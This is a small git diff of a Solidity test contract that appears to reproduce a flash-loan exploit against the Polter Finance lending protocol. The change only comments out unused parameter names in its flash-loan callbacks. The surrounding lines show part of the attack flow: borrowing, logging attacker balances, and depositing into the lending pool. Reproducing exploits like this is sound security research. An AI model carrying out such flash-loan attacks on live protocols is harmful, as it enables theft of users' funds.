@@ -84,7 +84,7 @@ contract Exploit_Polter_Finance is TestHarness, TokenBalanceTracker {
     }
 
 
-    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
+    function uniswapV3FlashCallback(uint256 /* fee0 */, uint256 fee1, bytes calldata /* data */) external {
         logBalancesWithLabel('Attacker', address(this));
 
         uint256 repay = BOO.balanceOf(address(this)) + fee1;
@@ -104,7 +104,7 @@ contract Exploit_Polter_Finance is TestHarness, TokenBalanceTracker {
         logBalancesWithLabel('Attacker', address(this));
     }
     
-    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+    function uniswapV2Call(address /* sender */, uint256 /* amount0 */, uint256 amount1, bytes calldata /* data */) external {
         BOO.approve(address(Lending), 1e18);
         Lending.deposit(address(BOO), 1e18, address(this), 0);
 
